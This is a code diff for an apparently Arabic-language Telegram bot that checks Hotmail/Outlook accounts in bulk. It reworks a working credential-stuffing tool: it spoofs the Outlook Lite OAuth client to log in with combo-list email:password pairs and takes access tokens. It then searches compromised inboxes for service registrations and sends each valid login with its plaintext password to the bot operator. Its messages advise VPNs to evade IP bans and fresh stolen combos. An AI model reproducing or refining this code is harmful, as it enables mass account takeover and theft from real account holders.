@@ -186,75 +186,118 @@ user_manager = UserManager()
 # ==================== HOTMAIL CHECKER ====================
 
 def get_hotmail_token(email, password):
-    """Enhanced Multi-Method Checker"""
-    
-    # Method 1: Try IMAP First (Most Reliable)
-    try:
-        import imaplib
-        mail = imaplib.IMAP4_SSL('outlook.office365.com', 993, timeout=10)
-        mail.login(email, password)
-        mail.select('INBOX')
-        mail.logout()
-        return "VALID_IMAP", "success"
-    except imaplib.IMAP4.error as e:
-        error = str(e).lower()
-        if 'authenticate' in error or 'login' in error or 'invalid' in error:
-            pass  # Try next method
-        else:
-            return None, "bad"
-    except:
-        pass  # Try next method
-    
-    # Method 2: Web Login (Fallback)
+    """Original strong method from hotmail-2V.py"""
     try:
         session = requests.Session()
-        headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Accept': 'text/html,application/xhtml+xml',
+        
+        # Step 1: Check email type
+        url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
+        headers1 = {
+            "X-OneAuth-AppName": "Outlook Lite",
+            "X-Office-Version": "3.11.0-minApi24",
+            "X-CorrelationId": str(uuid.uuid4()),
+            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
+            "Host": "odc.officeapps.live.com",
+            "Connection": "Keep-Alive",
+            "Accept-Encoding": "gzip"
         }
         
-        r = session.get('https://login.live.com/', headers=headers, timeout=10)
-        ppft = re.search(r'name="PPFT".*?value="(.*?)"', r.text)
-        url_post = re.search(r'urlPost:\'(.*?)\'', r.text)
+        r1 = session.get(url1, headers=headers1, timeout=15)
         
-        if ppft:
-            data = {
-                'login': email,
-                'loginfmt': email,
-                'passwd': password,
-                'PPFT': ppft.group(1),
-            }
-            
-            post_url = url_post.group(1) if url_post else 'https://login.live.com/ppsecure/post.srf'
-            r2 = session.post(post_url, data=data, headers=headers, allow_redirects=True, timeout=15)
-            
-            url = r2.url.lower()
-            text = r2.text.lower()
-            
-            if 'account.live.com' in url or 'outlook.live.com' in url:
-                return "VALID_WEB", "success"
-            
-            if 'verify' in text or 'help us protect' in text:
-                return "VALID_2FA", "2fa_required"
-            
-            if 'locked' in text or 'abuse' in url:
-                return None, "locked"
-    except:
-        pass
-    
-    # If all methods fail
-    return None, "bad"
+        if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
+            return None, "bad"
+        if "MSAccount" not in r1.text:
+            return None, "bad"
+        
+        time.sleep(0.3)
+        
+        # Step 2: Get authorization page
+        url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
+        
+        r2 = session.get(url2, headers={
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Connection": "keep-alive"
+        }, allow_redirects=True, timeout=15)
+        
+        # Extract login URL and PPFT
+        url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
+        ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
+        
+        if not url_match or not ppft_match:
+            return None, "parse_error"
+        
+        post_url = url_match.group(1).replace("\\/", "/")
+        ppft = ppft_match.group(1)
+        
+        # Step 3: Login
+        login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960"
+        
+        r3 = session.post(post_url, data=login_data, headers={
+            "Content-Type": "application/x-www-form-urlencoded",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Origin": "https://login.live.com",
+            "Referer": r2.url
+        }, allow_redirects=False, timeout=15)
+        
+        # Check for errors
+        if any(x in r3.text for x in ["account or password is incorrect", "error", "Incorrect password", "Invalid credentials"]):
+            return None, "bad"
+        
+        if any(url in r3.text for url in ["identity/confirm", "Abuse", "signedout", "locked"]):
+            return None, "locked"
+        
+        # Get authorization code
+        location = r3.headers.get("Location", "")
+        if not location:
+            return None, "bad"
+        
+        code_match = re.search(r'code=([^&]+)', location)
+        if not code_match:
+            return None, "bad"
+        
+        code = code_match.group(1)
+        
+        # Step 4: Get access token
+        token_data = {
+            "client_info": "1",
+            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
+            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
+            "grant_type": "authorization_code",
+            "code": code,
+            "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
+        }
+        
+        r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, timeout=15)
+        
+        if r4.status_code != 200 or "access_token" not in r4.text:
+            return None, "bad"
+        
+        token_json = r4.json()
+        access_token = token_json["access_token"]
+        
+        # Get CID
+        mspcid = None
+        for cookie in session.cookies:
+            if cookie.name == "MSPCID":
+                mspcid = cookie.value
+                break
+        cid = mspcid.upper() if mspcid else str(uuid.uuid4()).upper()
+        
+        return {"token": access_token, "cid": cid}, "success"
+        
+    except requests.exceptions.Timeout:
+        return None, "timeout"
+    except requests.exceptions.ConnectionError:
+        return None, "connection_error"
+    except Exception as e:
+        logger.error(f"Check error: {e}")
+        return None, "error"
 
 def check_via_imap(email, password):
-    """Standalone IMAP check"""
-    try:
-        import imaplib
-        mail = imaplib.IMAP4_SSL('outlook.office365.com', 993, timeout=10)
-        mail.login(email, password)
-        mail.logout()
-        return "valid_via_imap", "success"
-    except:
-        return None, "bad"
+    """Backup method - not used with original method"""
+    return None, "not_used"
 
 def check_emails_for_services(token, email, selected_services=None):
     """Check inbox for service registrations"""
@@ -301,7 +344,7 @@ def check_emails_for_services(token, email, selected_services=None):
         return {}
 
 def check_account(email, password, user_id, selected_services=None):
-    """Check single account with enhanced detection and logging"""
+    """Check single account using original strong method"""
     result = {
         "email": email,
         "password": password,
@@ -311,34 +354,32 @@ def check_account(email, password, user_id, selected_services=None):
     }
     
     try:
-        # Get token with multiple methods
-        token, status = get_hotmail_token(email, password)
+        # Get token using original method
+        token_data, status = get_hotmail_token(email, password)
         
-        if status == "success":
+        if status == "success" and token_data:
             result["status"] = "hit"
-            result["message"] = f"✅ Valid ({token})"
+            result["message"] = "✅ Valid Account"
             
             # Log the hit
             logger.info(f"HIT FOUND: {email}:{password}")
             
-            # Check for services
-            if token and "VALID" in str(token):
-                try:
-                    services_found = check_emails_for_services(token, email, selected_services)
-                    result["services"] = services_found
-                    
-                    if services_found:
-                        result["message"] += f" | 🎯 {len(services_found)} services"
-                except Exception as e:
-                    logger.error(f"Error checking services for {email}: {e}")
+            # Check for services if token available
+            if token_data and isinstance(token_data, dict):
+                access_token = token_data.get("token")
+                cid = token_data.get("cid")
+                
+                if access_token:
+                    try:
+                        services_found = check_emails_for_services_v2(access_token, cid, email, selected_services)
+                        result["services"] = services_found
+                        
+                        if services_found:
+                            result["message"] += f" | 🎯 {len(services_found)} services"
+                    except Exception as e:
+                        logger.error(f"Error checking services: {e}")
             
             # Update stats
-            user_manager.update_stats(user_id, hits=1, checks=1)
-            
-        elif status == "2fa_required":
-            result["status"] = "2fa_required"
-            result["message"] = "🔐 Valid - 2FA Required"
-            logger.info(f"2FA ACCOUNT: {email}:{password}")
             user_manager.update_stats(user_id, hits=1, checks=1)
             
         elif status == "locked":
@@ -354,6 +395,10 @@ def check_account(email, password, user_id, selected_services=None):
             result["status"] = "retry"
             result["message"] = "🔌 Connection Error"
             
+        elif status == "parse_error":
+            result["status"] = "retry"
+            result["message"] = "🔄 Parse Error - Retry"
+            
         else:
             result["status"] = "bad"
             result["message"] = "❌ Invalid"
@@ -365,6 +410,62 @@ def check_account(email, password, user_id, selected_services=None):
         result["message"] = f"❌ Error: {str(e)}"
     
     return result
+
+def check_emails_for_services_v2(access_token, cid, email, selected_services=None):
+    """Check for services using original search method"""
+    try:
+        search_url = "https://outlook.live.com/search/api/v2/query"
+        
+        services_to_check = {selected_services: services[selected_services]} if selected_services else services
+        
+        found_services = {}
+        
+        for service_name, service_info in services_to_check.items():
+            sender = service_info["sender"]
+            
+            payload = {
+                "Cvid": str(uuid.uuid4()),
+                "Scenario": {"Name": "owa.react"},
+                "TimeZone": "UTC",
+                "TextDecorations": "Off",
+                "EntityRequests": [{
+                    "EntityType": "Conversation",
+                    "ContentSources": ["Mailbox"],
+                    "Query": {
+                        "QueryString": f"from:{sender}",
+                    },
+                    "Sort": [{"Field": "Time", "SortDirection": "DESC"}],
+                    "From": 0,
+                    "Size": 1
+                }]
+            }
+            
+            headers = {
+                "Authorization": f"Bearer {access_token}",
+                "X-OWA-CANARY": cid,
+                "Content-Type": "application/json",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+            }
+            
+            try:
+                response = requests.post(search_url, json=payload, headers=headers, timeout=10)
+                
+                if response.status_code == 200:
+                    data = response.json()
+                    if data.get("EntitySets") and len(data["EntitySets"]) > 0:
+                        entities = data["EntitySets"][0].get("ResultSet", {}).get("Entities", [])
+                        if len(entities) > 0:
+                            found_services[service_name] = True
+                
+                time.sleep(0.1)
+            except:
+                continue
+        
+        return found_services
+        
+    except Exception as e:
+        logger.error(f"Error in service check: {e}")
+        return {}
 
 # ==================== BOT HANDLERS ====================
 
@@ -756,7 +857,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await process_combos(query, context, file_path, lines, scan_type)
 
 async def process_combos(query, context, file_path, lines, scan_type):
-    """Process combo list with improved speed and accuracy"""
+    """Process combo list with INSTANT result sending"""
     user_id = query.from_user.id
     
     # Initialize stats
@@ -778,9 +879,11 @@ async def process_combos(query, context, file_path, lines, scan_type):
     # Status message
     status_msg = await context.bot.send_message(
         chat_id=user_id,
-        text="⏳ جاري الفحص...",
+        text="⏳ جاري الفحص...\n\n💡 سيتم إرسال كل حساب صحيح فوراً!",
         parse_mode='HTML'
     )
+    
+    start_time = time.time()
     
     # Process combos with rate limiting
     for i, line in enumerate(lines):
@@ -791,7 +894,7 @@ async def process_combos(query, context, file_path, lines, scan_type):
         email = parts[0].strip()
         password = parts[1].strip()
         
-        # Small delay to avoid rate limiting (0.3-0.5 seconds)
+        # Small delay to avoid rate limiting
         time.sleep(random.uniform(0.3, 0.5))
         
         # Check account
@@ -799,6 +902,7 @@ async def process_combos(query, context, file_path, lines, scan_type):
         
         stats["processed"] += 1
         
+        # INSTANT HIT NOTIFICATION
         if result["status"] == "hit":
             stats["hit"] += 1
             
@@ -806,6 +910,25 @@ async def process_combos(query, context, file_path, lines, scan_type):
             hit_file = os.path.join(result_dir, "Hits_All.txt")
             with open(hit_file, 'a', encoding='utf-8') as f:
                 f.write(f"{email}:{password} | {result['message']}\n")
+            
+            # 🚨 SEND HIT IMMEDIATELY TO USER 🚨
+            hit_message = f"""
+🎯 <b>حساب صحيح!</b> #{stats["hit"]}
+
+📧 <b>Email:</b> <code>{email}</code>
+🔑 <b>Password:</b> <code>{password}</code>
+
+{result['message']}
+            """
+            
+            try:
+                await context.bot.send_message(
+                    chat_id=user_id,
+                    text=hit_message,
+                    parse_mode='HTML'
+                )
+            except Exception as e:
+                logger.error(f"Error sending hit: {e}")
             
             # Save per service
             for service_name in result["services"].keys():
@@ -817,30 +940,53 @@ async def process_combos(query, context, file_path, lines, scan_type):
         
         elif result["status"] == "bad":
             stats["bad"] += 1
+            
         elif result["status"] == "locked":
             stats["locked"] += 1
+            
         elif result["status"] == "2fa_required":
             stats["2fa"] += 1
-            stats["hit"] += 1  # 2FA means valid account
+            stats["hit"] += 1
             
             # Save 2FA accounts
             twofa_file = os.path.join(result_dir, "Hits_2FA.txt")
             with open(twofa_file, 'a', encoding='utf-8') as f:
                 f.write(f"{email}:{password} | Requires 2FA\n")
+            
+            # 🚨 SEND 2FA HIT IMMEDIATELY 🚨
+            twofa_message = f"""
+🔐 <b>حساب صحيح - 2FA!</b> #{stats["hit"]}
+
+📧 <b>Email:</b> <code>{email}</code>
+🔑 <b>Password:</b> <code>{password}</code>
+
+⚠️ يحتاج تأكيد ثنائي (2FA)
+            """
+            
+            try:
+                await context.bot.send_message(
+                    chat_id=user_id,
+                    text=twofa_message,
+                    parse_mode='HTML'
+                )
+            except Exception as e:
+                logger.error(f"Error sending 2FA hit: {e}")
+                
         elif result["status"] == "retry":
             stats["retry"] += 1
         
-        # Update progress every 5 accounts or at milestones
-        if (i + 1) % 5 == 0 or (i + 1) == stats["total"] or (i + 1) % 100 == 0:
+        # Update progress every 5 accounts
+        if (i + 1) % 5 == 0 or (i + 1) == stats["total"]:
             progress = (stats["processed"] / stats["total"]) * 100
             
-            # Calculate estimated time remaining
+            # Calculate time
+            elapsed = time.time() - start_time
             if stats["processed"] > 0:
-                avg_time_per_check = (time.time() - int(result_dir.split('_')[-1])) / stats["processed"]
-                remaining = (stats["total"] - stats["processed"]) * avg_time_per_check
+                avg_time = elapsed / stats["processed"]
+                remaining = (stats["total"] - stats["processed"]) * avg_time
                 eta_minutes = int(remaining / 60)
                 eta_seconds = int(remaining % 60)
-                eta_text = f"\n⏱️ الوقت المتبقي: ~{eta_minutes}د {eta_seconds}ث"
+                eta_text = f"\n⏱️ المتبقي: ~{eta_minutes}د {eta_seconds}ث"
             else:
                 eta_text = ""
             
@@ -855,6 +1001,8 @@ async def process_combos(query, context, file_path, lines, scan_type):
 🔒 مقفل: {stats["locked"]}
 🔐 2FA: {stats["2fa"]}
 🔄 إعادة: {stats["retry"]}
+
+💡 يتم إرسال كل حساب صحيح فوراً!
             """
             
             try:
@@ -871,10 +1019,10 @@ async def process_combos(query, context, file_path, lines, scan_type):
 • صحيح: {stats["hit"]}
 • خاطئ: {stats["bad"]}
 • مقفل: {stats["locked"]}
-• 2FA مطلوب: {stats["2fa"]}
+• 2FA: {stats["2fa"]}
 • إعادة: {stats["retry"]}
 
-🎯 <b>الخدمات المكتشفة: {len(stats["services_found"])}</b>
+🎯 <b>الخدمات: {len(stats["services_found"])}</b>
     """
     
     if stats["services_found"]:
@@ -884,8 +1032,14 @@ async def process_combos(query, context, file_path, lines, scan_type):
     
     await status_msg.edit_text(final_text, parse_mode='HTML')
     
-    # Send result files
+    # Send result files if any hits
     if stats["hit"] > 0:
+        await context.bot.send_message(
+            chat_id=user_id,
+            text="📁 <b>إرسال ملفات النتائج...</b>",
+            parse_mode='HTML'
+        )
+        
         for filename in os.listdir(result_dir):
             file_path_result = os.path.join(result_dir, filename)
             
@@ -895,9 +1049,30 @@ async def process_combos(query, context, file_path, lines, scan_type):
                     document=open(file_path_result, 'rb'),
                     caption=f"📄 {filename}\n\n💎 {MY_SIGNATURE}"
                 )
-                time.sleep(0.5)  # Delay between file sends
-            except:
-                pass
+                time.sleep(0.5)
+            except Exception as e:
+                logger.error(f"Error sending file: {e}")
+    else:
+        # No hits found
+        await context.bot.send_message(
+            chat_id=user_id,
+            text=f"""
+😔 <b>لم يتم العثور على حسابات صحيحة</b>
+
+💡 <b>احتمالات:</b>
+• الكومبو قديم أو مستخدم كثيراً
+• IP محظور - جرب VPN
+• جودة الكومبو سيئة
+
+🔧 <b>جرب:</b>
+1. استخدم VPN وغيّر IP
+2. جرب كومبو جديد (أقل من شهر)
+3. استخدم quick_tester.py لاختبار الكومبو
+
+👤 آيديك: <code>{user_id}</code>
+            """,
+            parse_mode='HTML'
+        )
     
     # Cleanup
     try:
